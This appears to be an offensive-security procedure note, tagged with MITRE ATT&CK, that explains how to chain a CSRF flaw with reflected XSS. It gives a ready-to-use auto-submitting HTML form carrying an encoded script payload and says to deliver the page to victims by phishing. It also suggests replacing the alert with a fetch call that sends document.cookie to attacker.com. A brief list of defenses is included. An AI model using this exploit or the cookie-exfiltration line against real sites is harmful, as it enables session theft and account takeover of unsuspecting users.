---
id: proc-005
tags:
  - csrf-exploit
  - reflected-xss
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:15.882Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# Craft CSRF Attack for Reflected XSS

## Summary

This procedure exploits the CSRF vulnerability by creating a malicious HTML page with an auto-submitting form that injects the XSS payload, forcing reflected execution in a victim's authenticated browser.

## Description

Lacking CSRF tokens, the form endpoint allows cross-origin submissions. The attacker hosts an HTML page with a hidden form pre-filled with the encoded XSS payload in 'first_name' and other fields, using JavaScript to auto-submit on load. Victims tricked into visiting (e.g., via link) execute the reflected XSS, enabling attacks like cookie theft.

## Requirements

1. Confirmed self-XSS from prior steps
2. Ability to host HTML (local server or external)
3. Victim with active session on target site

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens in all forms
- Enforce same-origin policy strictly with CORS headers
- Monitor for cross-origin POST requests to sensitive endpoints

## Objectives

1. Force unauthorized form submission from external site
2. Achieve reflected XSS in victim context
3. Enable data exfiltration via JavaScript

## Instructions

### Step 1: Create Malicious HTML

**Context**: Build the CSRF PoC page with hidden form.

Use a text editor to create an HTML file:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf" action="https://██████████/" method="POST">
<input type="hidden" name="first_name" value='test&quot;; &lt;/script&gt;&lt;script&gt;alert(&quot;HACKED BY Sleep NOt Found&quot;)&lt;/script&gt;'>
<input type="hidden" name="middle_name" value="test">
<input type="hidden" name="last_name" value="test">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

> Encode the payload to bypass HTML parsing issues.

### Step 2: Host and Distribute

**Context**: Deliver the page to the victim.

Host the file on a server (e.g., local Python server: `python -m http.server 8000`) and send the URL via phishing email or link.

> Ensure the victim is authenticated to the target when loading.

### Step 3: Verify Execution

**Context**: Confirm auto-submission and XSS trigger.

Have the victim load the page; observe the alert in their browser.

> In production, replace alert with exfiltration code, e.g., `fetch('http://attacker.com?cookie='+document.cookie)`.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Drive-by Compromise]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf-exploit]]
- [[reflected-xss]]
